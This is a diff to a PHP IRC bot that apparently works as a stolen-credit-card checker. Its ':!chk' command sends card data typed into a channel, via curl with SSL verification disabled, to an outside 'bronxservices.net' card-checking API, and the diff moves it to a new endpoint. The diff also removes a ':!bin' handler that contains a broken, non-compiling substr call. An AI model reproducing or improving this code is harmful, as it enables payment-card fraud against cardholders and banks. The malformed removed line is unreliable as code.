@@ -102,19 +102,12 @@ while ( is_resource( $socket ) ) {
 
       } 
 
-  else if ( $d[3] === ':!bin' ) {
-  	$checkBIN = substr($d[4], 6, <);
-  $resposta = "07[ChkBIN] → 4 [ERROR]5 INSERTE UNA BIN VÁLIDA [!bin 666666]";
-    // ENVIANDO RESPOSTA AO IRC
-    socket_write($socket,'PRIVMSG '.$d[2]." :$resposta\r\n" );
-  }
-
      if ( $d[3] === ':!chk' ) {
          // SEPARA SOMENTE OS 11 DIGITOS
     $infocc = $d[4];
     // CURL
     $ch = curl_init();
-   curl_setopt($ch, CURLOPT_URL, "http://bronxservices.net/loja/pag.php?lista=$infocc");
+   curl_setopt($ch, CURLOPT_URL, "http://central.bronxservices.net/api/cartao/full/api.php?lista=$infocc");
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
@@ -125,7 +118,7 @@ while ( is_resource( $socket ) ) {
     $ex = explode(' ',$output);
     
     // DEFININDO MENSAGEM DE RESPOSTA AO IRC
-    $resposta = "07[ChkFULL] → $ex[1] ";
+    $resposta = "07[ChkFULL] → $output ";
      socket_write( $socket, 'PRIVMSG ' . $d[2] . " :$resposta\r\n" );
 
      }
